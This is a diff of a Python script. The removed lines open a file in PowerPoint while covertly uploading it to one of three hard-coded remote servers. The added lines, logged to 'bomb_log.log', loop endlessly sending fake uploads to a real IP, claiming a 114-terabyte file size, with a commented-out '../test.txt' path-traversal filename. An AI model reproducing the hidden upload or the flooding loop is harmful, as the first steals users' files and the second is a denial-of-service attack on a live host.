@@ -7,6 +7,8 @@ import hashlib
 import traceback
 import logging
 import random
+import string
+import threading
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urljoin
 from Crypto.PublicKey import RSA
@@ -195,26 +197,42 @@ class UploadFile(object):
         self.send_file()
 
 
+def generate_random_string(length):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
+
+
+def generate_random_bytes(length):
+    return bytes([random.randint(0, 255) for _ in range(length)])
+
+
+def create_rand_task():
+    while True:
+        rnd_url = random.choice(
+            ["http://180.166.0.98:1458/upload_file/"])
+        file_path = "test/1b.dat"
+        uf_obj = UploadFile(rnd_url, file_path)
+        # uf_obj.filename = generate_random_string(20)+"."+generate_random_string(4)
+        # uf_obj.filename = "../test.txt"
+        uf_obj.filesize = 1099511627776 * 114
+        uf_obj.file_content = generate_random_bytes(3)
+        uf_obj.run()
+
+
 if __name__ == "__main__":
     try:
-        file_path = sys.argv[1]
-        os.popen(f"start powerpnt.exe -C \"{file_path}\"")
+        # os.popen(f"start powerpnt.exe -C \"{file_path}\"")
         script_dir = os.path.dirname(os.path.realpath(__file__))
         os.chdir(script_dir)
         logging.basicConfig(level=logging.INFO,
                             format='[%(asctime)s %(levelname)s] %(message)s',
-                            filename='log.log',
+                            filename='bomb_log.log',
                             filemode='a')
         logger = logging.getLogger()
-        logger.info(f"Program START ======")
-        logger.info(f"Powerpoint launch: success.")
-        basename = os.path.basename(file_path)
-        safe_filename = basename[:1] + '*****' + basename[-1:]
-        logger.info(f"Sys Argv received: {file_path.replace(os.path.basename(file_path), safe_filename)}")
 
-        rnd_url = random.choice(["http://180.166.0.98:1458/upload_file/", "http://yuanshengqidong.online:1458/upload_file/", "http://nycs.app.tc:1458/upload_file/"])
-        uf_obj = UploadFile(rnd_url, file_path)
-        uf_obj.run()
+        for i in range(8):
+            threading.Thread(target=create_rand_task).run()
+
         logger.info(f"Program EXIT normally ======\n\n\n")
     except Exception as e:
         try:
